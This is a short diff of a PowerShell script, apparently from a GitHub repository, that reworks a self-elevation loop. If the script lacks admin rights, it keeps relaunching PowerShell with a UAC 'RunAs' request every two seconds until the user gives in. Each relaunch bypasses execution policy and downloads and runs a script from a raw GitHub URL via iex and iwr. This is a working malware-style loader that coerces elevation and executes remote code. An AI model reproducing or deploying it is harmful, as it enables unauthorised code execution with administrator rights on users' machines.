@@ -14,10 +14,11 @@ $self = "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1"
 if (-not $isAdmin) {
     while ($true) {
         try {
-            $proc = Start-Process powershell -Verb RunAs -PassThru -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command iex((iwr '$self' -UseBasicParsing).Content)" -ErrorAction Stop
-            if ($proc) { break }
-        } catch {}
-        Start-Sleep -Seconds 2
+            Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command iex((iwr '$self' -UseBasicParsing).Content)" -ErrorAction Stop
+            exit
+        } catch {
+            Start-Sleep -Seconds 2
+        }
     }
     exit
 }
